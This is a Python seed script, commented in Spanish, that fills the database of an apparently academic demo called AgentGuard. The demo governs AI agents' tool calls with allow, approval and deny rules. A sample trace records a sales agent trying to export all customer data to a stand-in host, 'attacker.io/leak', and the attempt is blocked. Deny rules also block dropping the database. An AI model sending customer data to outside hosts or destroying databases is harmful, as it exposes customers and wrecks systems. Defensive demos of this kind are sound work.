"""Script de Inicialización y Semillas de Datos para AgentGuard (Demo Oficial).

Puebla la base de datos PostgreSQL con la organización corporativa, usuarios con roles,
agentes de IA, herramientas externas, capacidades (AgentTool), políticas contextuales
y reglas deterministas requeridas para ejecutar los 4 escenarios de la demo académica
(agentguard_secuencia_demo.md) y los flujos del Frontend Dashboard.

Uso:
    python -m scripts.seed_demo [--reset]
    o desde la raíz: python scripts/seed_demo.py [--reset]
"""

import argparse
import asyncio
import logging
import sys
import uuid
from datetime import datetime, timezone
from pathlib import Path

# Asegurar backend en sys.path
backend_path = Path(__file__).resolve().parent.parent
if str(backend_path) not in sys.path:
    sys.path.insert(0, str(backend_path))

from sqlalchemy import select, delete
from sqlalchemy.ext.asyncio import AsyncSession

from app.core.database import AsyncSessionLocal, engine
from app.models.agent import Agent, AgentTool
from app.models.alert import Alert
from app.models.approval import Approval
from app.models.enums import (
    AgentStatus,
    AlertSeverity,
    AlertStatus,
    ApprovalStatus,
    ExecutionStatus,
    PolicyDecision,
    RiskLevel,
    RuleEffect,
    UserRole,
)
from app.models.execution import Execution
from app.models.organization import Organization
from app.models.policy import Policy, PolicyRule
from app.models.tool import Tool, ToolAction
from app.models.user import User

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("agentguard.seed")

# ==============================================================================
# Identificadores Deterministas (UUIDs v4 fijos para reproducibilidad)
# ==============================================================================

ORG_ACME_ID = uuid.UUID("11111111-1111-1111-1111-111111111111")

USER_ADMIN_ID = uuid.UUID("22222222-2222-2222-2222-222222222201")
USER_APPROVER_ID = uuid.UUID("22222222-2222-2222-2222-222222222202")
USER_OPERATOR_ID = uuid.UUID("22222222-2222-2222-2222-222222222203")

AGENT_SALES_ID = uuid.UUID("33333333-3333-3333-3333-333333333301")
AGENT_FINANCE_ID = uuid.UUID("33333333-3333-3333-3333-333333333302")
AGENT_SUPPORT_ID = uuid.UUID("33333333-3333-3333-3333-333333333303")

TOOL_CRM_ID = uuid.UUID("44444444-4444-4444-4444-444444444401")
TOOL_STRIPE_ID = uuid.UUID("44444444-4444-4444-4444-444444444402")
TOOL_CATALOG_ID = uuid.UUID("44444444-4444-4444-4444-444444444403")
TOOL_DB_ID = uuid.UUID("44444444-4444-4444-4444-444444444404")

ACTION_CREATE_QUOTE_ID = uuid.UUID("55555555-5555-5555-5555-555555555501")
ACTION_EXPORT_CUSTOMERS_ID = uuid.UUID("55555555-5555-5555-5555-555555555502")
ACTION_REFUND_ID = uuid.UUID("55555555-5555-5555-5555-555555555503")
ACTION_UPDATE_PRICE_ID = uuid.UUID("55555555-5555-5555-5555-555555555504")
ACTION_DROP_DB_ID = uuid.UUID("55555555-5555-5555-5555-555555555505")

POLICY_SALES_ID = uuid.UUID("66666666-6666-6666-6666-666666666601")
POLICY_GLOBAL_SAFETY_ID = uuid.UUID("66666666-6666-6666-6666-666666666602")

RULE_QUOTE_ALLOW_ID = uuid.UUID("77777777-7777-7777-7777-777777777701")
RULE_REFUND_APPROVAL_ID = uuid.UUID("77777777-7777-7777-7777-777777777702")
RULE_REFUND_ALLOW_ID = uuid.UUID("77777777-7777-7777-7777-777777777703")
RULE_EXPORT_DENY_ID = uuid.UUID("77777777-7777-7777-7777-777777777704")
RULE_DROP_DB_DENY_ID = uuid.UUID("77777777-7777-7777-7777-777777777705")

SAMPLE_EXEC_ALLOW_ID = uuid.UUID("88888888-8888-8888-8888-888888888801")
SAMPLE_EXEC_APPROVAL_ID = uuid.UUID("88888888-8888-8888-8888-888888888802")
SAMPLE_APPROVAL_ID = uuid.UUID("88888888-8888-8888-8888-888888888803")
SAMPLE_EXEC_ALERT_ID = uuid.UUID("88888888-8888-8888-8888-888888888804")
SAMPLE_ALERT_ID = uuid.UUID("88888888-8888-8888-8888-888888888805")


async def clear_database(session: AsyncSession) -> None:
    """Limpia las tablas operativas de la organización Acme Corp."""
    logger.warning("Reseteando datos existentes de la organización Acme Corp...")
    await session.execute(delete(Alert).where(Alert.organization_id == ORG_ACME_ID))
    await session.execute(delete(Approval).where(
        Approval.execution_id.in_(
            select(Execution.id).where(Execution.organization_id == ORG_ACME_ID)
        )
    ))
    await session.execute(delete(Execution).where(Execution.organization_id == ORG_ACME_ID))
    await session.execute(delete(PolicyRule).where(
        PolicyRule.policy_id.in_(
            select(Policy.id).where(Policy.organization_id == ORG_ACME_ID)
        )
    ))
    await session.execute(delete(Policy).where(Policy.organization_id == ORG_ACME_ID))
    await session.execute(delete(AgentTool).where(
        AgentTool.agent_id.in_(
            select(Agent.id).where(Agent.organization_id == ORG_ACME_ID)
        )
    ))
    await session.execute(delete(ToolAction).where(
        ToolAction.tool_id.in_(
            select(Tool.id).where(Tool.organization_id == ORG_ACME_ID)
        )
    ))
    await session.execute(delete(Tool).where(Tool.organization_id == ORG_ACME_ID))
    await session.execute(delete(Agent).where(Agent.organization_id == ORG_ACME_ID))
    await session.execute(delete(User).where(User.organization_id == ORG_ACME_ID))
    await session.execute(delete(Organization).where(Organization.id == ORG_ACME_ID))
    await session.commit()
    logger.info("Limpieza completada.")


async def seed_data(reset: bool = False) -> None:
    """Puebla todas las entidades requeridas para la demo oficial."""
    now = datetime.now(timezone.utc)

    async with AsyncSessionLocal() as session:
        # Verificar si la organización ya existe
        existing_org = await session.get(Organization, ORG_ACME_ID)
        if existing_org:
            if reset:
                await clear_database(session)
            else:
                logger.info("La organización Acme Corp ya existe. Usa --reset para recrear.")
                return

        logger.info("Iniciando creación de semillas oficiales de AgentGuard...")

        # 1. Organización Raíz (Tenant)
        org = Organization(
            id=ORG_ACME_ID,
            name="Acme Corp",
            created_at=now,
        )
        session.add(org)

        # 2. Usuarios Corporativos
        user_admin = User(
            id=USER_ADMIN_ID,
            organization_id=ORG_ACME_ID,
            email="admin@acme.corp",
            role=UserRole.ADMIN,
            created_at=now,
        )
        user_approver = User(
            id=USER_APPROVER_ID,
            organization_id=ORG_ACME_ID,
            email="approver@acme.corp",
            role=UserRole.APPROVER,
            created_at=now,
        )
        user_operator = User(
            id=USER_OPERATOR_ID,
            organization_id=ORG_ACME_ID,
            email="operator@acme.corp",
            role=UserRole.OPERATOR,
            created_at=now,
        )
        session.add_all([user_admin, user_approver, user_operator])

        # 3. Agentes de IA
        agent_sales = Agent(
            id=AGENT_SALES_ID,
            organization_id=ORG_ACME_ID,
            owner_user_id=USER_ADMIN_ID,
            name="Agente de Ventas",
            purpose="Gestión comercial, cotizaciones para clientes y reembolsos autorizados.",
            status=AgentStatus.ACTIVE,
            created_at=now,
        )
        agent_finance = Agent(
            id=AGENT_FINANCE_ID,
            organization_id=ORG_ACME_ID,
            owner_user_id=USER_ADMIN_ID,
            name="Finance Copilot",
            purpose="Conciliación de pagos, facturación e informes financieros.",
            status=AgentStatus.ACTIVE,
            created_at=now,
        )
        agent_support = Agent(
            id=AGENT_SUPPORT_ID,
            organization_id=ORG_ACME_ID,
            owner_user_id=USER_ADMIN_ID,
            name="Support Assistant",
            purpose="Atención a clientes y consulta de tickets en Zendesk.",
            status=AgentStatus.ACTIVE,
            created_at=now,
        )
        session.add_all([agent_sales, agent_finance, agent_support])

        # 4. Herramientas Externas (Tools)
        tool_crm = Tool(
            id=TOOL_CRM_ID,
            organization_id=ORG_ACME_ID,
            name="CRM & Facturación",
            protocol="REST",
            endpoint_url="https://crm.api.corp",
            description="API empresarial de CRM y gestión de facturación a clientes.",
            created_at=now,
        )
        tool_stripe = Tool(
            id=TOOL_STRIPE_ID,
            organization_id=ORG_ACME_ID,
            name="Stripe Payments",
            protocol="REST",
            endpoint_url="https://stripe.api.corp",
            description="Pasarela de pagos y reembolsos de transacciones.",
            created_at=now,
        )
        tool_catalog = Tool(
            id=TOOL_CATALOG_ID,
            organization_id=ORG_ACME_ID,
            name="Catálogo de Precios",
            protocol="REST",
            endpoint_url="https://pricing.api.corp",
            description="Base de datos de precios de lista y catálogo comercial.",
            created_at=now,
        )
        tool_db = Tool(
            id=TOOL_DB_ID,
            organization_id=ORG_ACME_ID,
            name="Database Administrator",
            protocol="REST",
            endpoint_url="https://db.api.corp",
            description="Gestor de base de datos relacional y mantenimiento de esquemas.",
            created_at=now,
        )
        session.add_all([tool_crm, tool_stripe, tool_catalog, tool_db])

        # 5. Acciones Atómicas (ToolActions) con Nivel de Riesgo
        act_quote = ToolAction(
            id=ACTION_CREATE_QUOTE_ID,
            tool_id=TOOL_CRM_ID,
            action_name="create_quote",
            risk_level=RiskLevel.LOW,
            description="Emisión de cotización y presupuesto a cliente.",
            created_at=now,
        )
        act_export = ToolAction(
            id=ACTION_EXPORT_CUSTOMERS_ID,
            tool_id=TOOL_CRM_ID,
            action_name="export_customers",
            risk_level=RiskLevel.CRITICAL,
            description="Exportación masiva de datos y listados de clientes.",
            created_at=now,
        )
        act_refund = ToolAction(
            id=ACTION_REFUND_ID,
            tool_id=TOOL_STRIPE_ID,
            action_name="refund",
            risk_level=RiskLevel.HIGH,
            description="Devolución y reembolso de dinero a cliente.",
            created_at=now,
        )
        act_update_price = ToolAction(
            id=ACTION_UPDATE_PRICE_ID,
            tool_id=TOOL_CATALOG_ID,
            action_name="update_price",
            risk_level=RiskLevel.HIGH,
            description="Modificación del precio de venta de un producto.",
            created_at=now,
        )
        act_drop_db = ToolAction(
            id=ACTION_DROP_DB_ID,
            tool_id=TOOL_DB_ID,
            action_name="database.drop",
            risk_level=RiskLevel.CRITICAL,
            description="Eliminación destructiva de tablas o base de datos.",
            created_at=now,
        )
        session.add_all([act_quote, act_export, act_refund, act_update_price, act_drop_db])

        # 6. Asignación de Capacidades (AgentTool)
        # Escenario 1 y 3: Agente de Ventas tiene autorizado CRM y Stripe
        cap_sales_crm = AgentTool(
            id=uuid.uuid4(),
            agent_id=AGENT_SALES_ID,
            tool_id=TOOL_CRM_ID,
            enabled=True,
            config={"max_requests_per_minute": 60},
            created_at=now,
        )
        cap_sales_stripe = AgentTool(
            id=uuid.uuid4(),
            agent_id=AGENT_SALES_ID,
            tool_id=TOOL_STRIPE_ID,
            enabled=True,
            config={"currency": "USD"},
            created_at=now,
        )
        # Nota de Seguridad: Agente de Ventas NO TIENE ASIGNADO TOOL_CATALOG_ID ni TOOL_DB_ID (Escenarios 2 y 5)

        cap_finance_stripe = AgentTool(
            id=uuid.uuid4(),
            agent_id=AGENT_FINANCE_ID,
            tool_id=TOOL_STRIPE_ID,
            enabled=True,
            config={},
            created_at=now,
        )
        cap_support_crm = AgentTool(
            id=uuid.uuid4(),
            agent_id=AGENT_SUPPORT_ID,
            tool_id=TOOL_CRM_ID,
            enabled=True,
            config={},
            created_at=now,
        )
        session.add_all([cap_sales_crm, cap_sales_stripe, cap_finance_stripe, cap_support_crm])

        # 7. Políticas de Autorización
        pol_sales = Policy(
            id=POLICY_SALES_ID,
            organization_id=ORG_ACME_ID,
            name="Políticas de Operación y Seguridad para Agente de Ventas",
            description="Reglas comerciales de cotización, reembolsos y contención perimetral.",
            priority=100,
            is_active=True,
            created_at=now,
        )
        pol_global = Policy(
            id=POLICY_GLOBAL_SAFETY_ID,
            organization_id=ORG_ACME_ID,
            name="Guardrails Globales de Seguridad",
            description="Políticas estrictas anti-exfiltración y protección de infraestructura.",
            priority=200,
            is_active=True,
            created_at=now,
        )
        session.add_all([pol_sales, pol_global])

        # 8. Reglas de Autorización Deterministas (Evaluadas por el PDP)
        # Escenario 1: create_quote < $10.000 -> ALLOW
        rule_quote_allow = PolicyRule(
            id=RULE_QUOTE_ALLOW_ID,
            policy_id=POLICY_SALES_ID,
            priority=100,
            effect=RuleEffect.ALLOW,
            tool_action_id=ACTION_CREATE_QUOTE_ID,
            target_agent_id=AGENT_SALES_ID,
            conditions={"amount": {"lte": 10000}},
            created_at=now,
        )
        # Escenario 3: refund >= $500 -> REQUIRE_APPROVAL
        rule_refund_approval = PolicyRule(
            id=RULE_REFUND_APPROVAL_ID,
            policy_id=POLICY_SALES_ID,
            priority=100,
            effect=RuleEffect.REQUIRE_APPROVAL,
            tool_action_id=ACTION_REFUND_ID,
            target_agent_id=AGENT_SALES_ID,
            conditions={"amount": {"gte": 500}},
            created_at=now,
        )
        # Escenario 3 complementario: refund < $500 -> ALLOW
        rule_refund_allow = PolicyRule(
            id=RULE_REFUND_ALLOW_ID,
            policy_id=POLICY_SALES_ID,
            priority=50,
            effect=RuleEffect.ALLOW,
            tool_action_id=ACTION_REFUND_ID,
            target_agent_id=AGENT_SALES_ID,
            conditions={"amount": {"lt": 500}},
            created_at=now,
        )
        # Escenario 4: export_customers bloqueado por defecto -> DENY
        rule_export_deny = PolicyRule(
            id=RULE_EXPORT_DENY_ID,
            policy_id=POLICY_GLOBAL_SAFETY_ID,
            priority=200,
            effect=RuleEffect.DENY,
            tool_action_id=ACTION_EXPORT_CUSTOMERS_ID,
            target_agent_id=None,  # Regla global
            conditions={},
            created_at=now,
        )
        # Escenario 5: database.drop bloqueado por defecto -> DENY
        rule_drop_db_deny = PolicyRule(
            id=RULE_DROP_DB_DENY_ID,
            policy_id=POLICY_GLOBAL_SAFETY_ID,
            priority=300,
            effect=RuleEffect.DENY,
            tool_action_id=ACTION_DROP_DB_ID,
            target_agent_id=None,  # Regla global
            conditions={},
            created_at=now,
        )
        session.add_all([
            rule_quote_allow,
            rule_refund_approval,
            rule_refund_allow,
            rule_export_deny,
            rule_drop_db_deny,
        ])

        # 9. Trazas Forenses Iniciales y Muestra para el Dashboard Web
        # 9.1 Traza de Cotización Ejecutada con Éxito (ALLOW)
        exec_allow = Execution(
            id=SAMPLE_EXEC_ALLOW_ID,
            organization_id=ORG_ACME_ID,
            agent_id=AGENT_SALES_ID,
            delegator_user_id=USER_OPERATOR_ID,
            tool_id=TOOL_CRM_ID,
            tool_action_id=ACTION_CREATE_QUOTE_ID,
            resource="quotes/QT-101",
            request_context={"amount": 2500, "customer": "Acme Corp"},
            decision=PolicyDecision.ALLOW,
            status=ExecutionStatus.EXECUTED,
            evaluated_policy_rule_id=RULE_QUOTE_ALLOW_ID,
            timestamp=now,
        )
        session.add(exec_allow)

        # 9.2 Traza y Ticket de Aprobación Pendiente (REQUIRE_APPROVAL)
        exec_approval = Execution(
            id=SAMPLE_EXEC_APPROVAL_ID,
            organization_id=ORG_ACME_ID,
            agent_id=AGENT_SALES_ID,
            delegator_user_id=USER_OPERATOR_ID,
            tool_id=TOOL_STRIPE_ID,
            tool_action_id=ACTION_REFUND_ID,
            resource="refunds/rf_9921",
            request_context={"amount": 4500, "customer_id": "cust-302", "reason": "damaged_goods"},
            decision=PolicyDecision.REQUIRE_APPROVAL,
            status=ExecutionStatus.PENDING_APPROVAL,
            evaluated_policy_rule_id=RULE_REFUND_APPROVAL_ID,
            timestamp=now,
        )
        session.add(exec_approval)

        sample_approval = Approval(
            id=SAMPLE_APPROVAL_ID,
            execution_id=SAMPLE_EXEC_APPROVAL_ID,
            assigned_approver_id=USER_APPROVER_ID,
            status=ApprovalStatus.PENDING,
            created_at=now,
        )
        session.add(sample_approval)

        # 9.3 Traza y Alerta Crítica de Intento de Exfiltración (DENY + ALERT)
        exec_alert = Execution(
            id=SAMPLE_EXEC_ALERT_ID,
            organization_id=ORG_ACME_ID,
            agent_id=AGENT_SALES_ID,
            delegator_user_id=None,
            tool_id=TOOL_CRM_ID,
            tool_action_id=ACTION_EXPORT_CUSTOMERS_ID,
            resource="customers/all",
            request_context={"destination": "https://attacker.io/leak"},
            decision=PolicyDecision.DENY,
            status=ExecutionStatus.REJECTED,
            evaluated_policy_rule_id=RULE_EXPORT_DENY_ID,
            timestamp=now,
        )
        session.add(exec_alert)

        sample_alert = Alert(
            id=SAMPLE_ALERT_ID,
            organization_id=ORG_ACME_ID,
            execution_id=SAMPLE_EXEC_ALERT_ID,
            title="Alerta de Seguridad: Intento de Exfiltración Bloqueado",
            description="El Agente de Ventas intentó exportar la base de clientes a destino no autorizado 'https://attacker.io/leak'.",
            severity=AlertSeverity.CRITICAL,
            status=AlertStatus.OPEN,
            created_at=now,
        )
        session.add(sample_alert)

        await session.commit()
        logger.info("====================================================================")
        logger.info("[OK] ¡Semillas de demostración de AgentGuard creadas con éxito!")
        logger.info("====================================================================")
        logger.info(f"  Organización: Acme Corp ({ORG_ACME_ID})")
        logger.info(f"  Admin:        admin@acme.corp ({USER_ADMIN_ID})")
        logger.info(f"  Approver:     approver@acme.corp ({USER_APPROVER_ID})")
        logger.info(f"  Agente Demo:  Agente de Ventas ({AGENT_SALES_ID})")
        logger.info("  Escenarios Disponibles:")
        logger.info("    - Escenario 1: create_quote < $10,000 -> ALLOW (200 OK)")
        logger.info("    - Escenario 2: update_price (sin capacidad) -> DENY (403 Forbidden)")
        logger.info("    - Escenario 3: refund >= $500 -> REQUIRE_APPROVAL (202 Accepted)")
        logger.info("    - Escenario 4: export_customers -> DENY + Alerta CRITICAL")
        logger.info("    - Escenario 5: database.drop -> DENY (403 Forbidden)")
        logger.info("====================================================================")


def main():
    parser = argparse.ArgumentParser(description="Poblar base de datos con semillas de la demo oficial")
    parser.add_argument("--reset", action="store_true", help="Elimina los datos previos de la demo antes de sembrar")
    args = parser.parse_args()

    asyncio.run(seed_data(reset=args.reset))


if __name__ == "__main__":
    main()
